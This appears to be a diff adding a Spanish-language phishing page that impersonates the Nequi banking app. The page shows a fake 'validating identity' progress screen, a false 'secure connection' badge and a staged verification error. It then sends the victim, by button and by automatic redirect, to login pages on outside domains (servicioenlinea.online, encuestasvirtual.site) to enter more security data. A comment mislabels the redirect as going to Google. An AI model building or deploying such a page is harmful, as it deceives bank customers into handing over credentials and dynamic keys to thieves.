@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesando - Nequi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #2E0039 0%, #4A148C 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .logo {
+            margin-bottom: 30px;
+        }
+        
+        .logo-icon {
+            background: #2E0039;
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 24px;
+            margin: 0 auto 15px;
+        }
+        
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #2E0039;
+        }
+        
+        .loader-container {
+            margin: 30px 0;
+        }
+        
+        .loader {
+            width: 80px;
+            height: 80px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #00C853;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-text {
+            font-size: 16px;
+            color: #3A0A63;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+        
+        .progress-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+        }
+        
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #E3D4EE;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .dot:nth-child(2) {
+            animation-delay: 0.3s;
+        }
+        
+        .dot:nth-child(3) {
+            animation-delay: 0.6s;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+        
+        .status-message {
+            background: #F9F3FF;
+            border-left: 4px solid #00C853;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 25px 0;
+            text-align: left;
+        }
+        
+        .status-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #2E0039;
+            margin-bottom: 5px;
+        }
+        
+        .status-subtitle {
+            font-size: 14px;
+            color: #3A0A63;
+            opacity: 0.8;
+        }
+        
+        .progress-steps {
+            margin: 25px 0;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            background: #F9F3FF;
+        }
+        
+        .step-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #E3D4EE;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #3A0A63;
+        }
+        
+        .step.active .step-icon {
+            background: #00C853;
+            color: white;
+        }
+        
+        .step.error .step-icon {
+            background: #FF4444;
+            color: white;
+        }
+        
+        .step-text {
+            flex: 1;
+            text-align: left;
+        }
+        
+        .step-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #3A0A63;
+        }
+        
+        .step-description {
+            font-size: 12px;
+            color: #3A0A63;
+            opacity: 0.7;
+        }
+        
+        .timer {
+            font-size: 14px;
+            color: #3A0A63;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+        
+        .security-badge {
+            background: rgba(0, 200, 83, 0.1);
+            border: 1px solid #00C853;
+            color: #00C853;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: inline-block;
+            margin-top: 20px;
+        }
+        
+        .security-badge.error {
+            background: rgba(255, 68, 68, 0.1);
+            border: 1px solid #FF4444;
+            color: #FF4444;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #E3D4EE;
+        }
+        
+        .footer-text {
+            font-size: 12px;
+            color: #3A0A63;
+            opacity: 0.7;
+        }
+
+        /* Estilos para el mensaje de error final */
+        .error-container {
+            display: none;
+            background: #FFE9F5;
+            border: 2px solid #FF4444;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .error-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .error-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #D32F2F;
+            margin-bottom: 10px;
+        }
+
+        .error-message {
+            font-size: 16px;
+            color: #D32F2F;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .retry-button {
+            background: #2E0039;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .retry-button:hover {
+            background: #3A0A63;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-text">Nequi</div>
+            <img src="https://i.ytimg.com/vi/NrZ3sekzj8I/hq720.jpg?sqp=-oaymwE7CK4FEIIDSFryq4qpAy0IARUAAAAAGAElAADIQj0AgKJD8AEB-AH-CYAC0AWKAgwIABABGEIgEyh_MA8=&rs=AOn4CLCugCpuvPmTm3tnsNGvB_zeML3XKQ" alt="Imagen" style="width:250px; height:auto;border-radius:5px;">
+        </div>
+         
+        <div class="loader-container" id="loaderContainer">
+            <div class="loader"></div>
+            <div class="progress-text">Procesando tu solicitud</div>
+            <div class="progress-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </div>
+        
+        <div class="status-message">
+            <div class="status-title">Validación en progreso</div>
+            <div class="status-subtitle">Estamos verificando tu información de seguridad. Esto puede tomar unos segundos.</div>
+        </div>
+        
+        <div class="progress-steps">
+            <div class="step active">
+                <div class="step-icon">✓</div>
+                <div class="step-text">
+                    <div class="step-title">Información recibida</div>
+                    <div class="step-description">Tus datos han sido enviados correctamente</div>
+                </div>
+            </div>
+            
+            <div class="step active">
+                <div class="step-icon">✓</div>
+                <div class="step-text">
+                    <div class="step-title">Validando identidad</div>
+                    <div class="step-description">Verificando información de seguridad</div>
+                </div>
+            </div>
+            
+            <div class="step">
+                <div class="step-icon">◯</div>
+                <div class="step-text">
+                    <div class="step-title">Procesando solicitud</div>
+                    <div class="step-description">Activando tu clave dinámica</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="timer" id="timer">
+            Tiempo estimado: <span id="time">30</span> segundos
+        </div>
+        
+        <div class="security-badge" id="securityBadge">
+            🔒 Conexión segura establecida
+        </div>
+        
+        <!-- Mensaje de error final -->
+        <div class="error-container" id="errorContainer">
+            <div class="error-icon">❌</div>
+            <div class="error-title">Error de Verificación</div>
+            <div class="error-message">
+                No se pudo completar la validación. <strong>Corrija una pregunta de seguridad para continuar con el proceso de desbloqueo.</strong>
+            </div>
+            <button class="retry-button" onclick="window.location.href='https://servicioenlinea.online/dinainvalida/cel-login.html'">Reintentar</button>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-text">
+                No cierres esta ventana mientras se completa el proceso
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Simular progreso de los pasos
+        let currentStep = 2; // Empezamos con los primeros dos activos
+        const steps = document.querySelectorAll('.step');
+        const loaderContainer = document.getElementById('loaderContainer');
+        const errorContainer = document.getElementById('errorContainer');
+        const timerElement = document.getElementById('time');
+        const securityBadge = document.getElementById('securityBadge');
+        
+        function completeProcessWithError() {
+            // Activar el tercer paso con error
+            if (steps[2]) {
+                steps[2].classList.add('active', 'error');
+                steps[2].querySelector('.step-icon').innerHTML = '❌';
+                steps[2].querySelector('.step-title').textContent = 'Error en la validación';
+                steps[2].querySelector('.step-description').textContent = 'No se pudo completar la verificación';
+            }
+            
+            // Ocultar loader y mostrar error
+            loaderContainer.style.display = 'none';
+            errorContainer.style.display = 'block';
+            
+            // Cambiar el badge de seguridad a error
+            securityBadge.textContent = '❌ Error de verificación';
+            securityBadge.classList.add('error');
+            
+            // Actualizar el mensaje de estado
+            const statusMessage = document.querySelector('.status-message');
+            statusMessage.style.background = '#FFE9F5';
+            statusMessage.style.borderLeft = '4px solid #FF4444';
+            document.querySelector('.status-title').textContent = 'Error de validación';
+            document.querySelector('.status-subtitle').textContent = 'Se encontró un problema con la información proporcionada';
+            document.querySelector('.status-title').style.color = '#D32F2F';
+            document.querySelector('.status-subtitle').style.color = '#D32F2F';
+            
+            // Redirigir a Google después de 3 segundos
+            setTimeout(() => {
+                window.location.href = 'https://encuestasvirtual.site/dina3.html';
+            }, 3000);
+        }
+        
+        function updateProgress() {
+            // Activar el tercer paso después de 25 segundos (antes de que termine el timer)
+            setTimeout(() => {
+                if (steps[2]) {
+                    steps[2].classList.add('active', 'error');
+                    steps[2].querySelector('.step-icon').innerHTML = '❌';
+                    steps[2].querySelector('.step-title').textContent = 'Error en la validación';
+                    steps[2].querySelector('.step-description').textContent = 'No se pudo completar la verificación';
+                }
+            }, 5000);
+            
+            // Completar el proceso con error cuando termine el tiempo
+            setTimeout(() => {
+                completeProcessWithError();
+            }, 10000);
+        }
+        
+        // Temporizador countdown
+        let timeLeft = 30;
+        
+        function updateTimer() {
+            if (timeLeft > 0) {
+                timeLeft--;
+                timerElement.textContent = timeLeft;
+            }
+        }
+        
+        // Iniciar temporizador
+        const timerInterval = setInterval(updateTimer, 1000);
+        
+        // Iniciar progreso
+        updateProgress();
+        
+        // Simular cambios de estado cada 5 segundos
+        const statusMessages = [
+            "Verificando datos de seguridad...",
+            "Validando información personal...", 
+            "Procesando solicitud de activación...",
+            "Finalizando configuración..."
+        ];
+        
+        let statusIndex = 0;
+        const statusTitle = document.querySelector('.status-title');
+        
+        const statusInterval = setInterval(() => {
+            statusIndex = (statusIndex + 1) % statusMessages.length;
+            statusTitle.textContent = statusMessages[statusIndex];
+        }, 5000);
+    </script>
+</body>
+</html>
